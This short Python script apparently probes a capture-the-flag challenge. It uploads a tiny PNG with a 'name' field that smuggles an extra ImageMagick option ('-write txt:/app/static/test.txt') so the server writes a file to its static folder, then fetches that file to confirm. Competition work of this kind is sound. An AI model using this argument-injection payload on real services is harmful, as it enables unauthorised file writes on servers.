import requests
url='https://aa1fadfd635d-magik.challs.m0lecon.it'
png=bytes.fromhex('89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c4890000000a49444154789c6300010000050001f5c27d0000000049454e44ae426082')
name='dummy -write txt:/app/static/test.txt result'
files={'img':('tiny.png',png,'image/png')}
data={'name':name}
resp=requests.post(url,files=files,data=data,timeout=10)
print('upload',resp.status_code)
print(requests.get(f"{url}/static/test.txt",timeout=10).status_code)
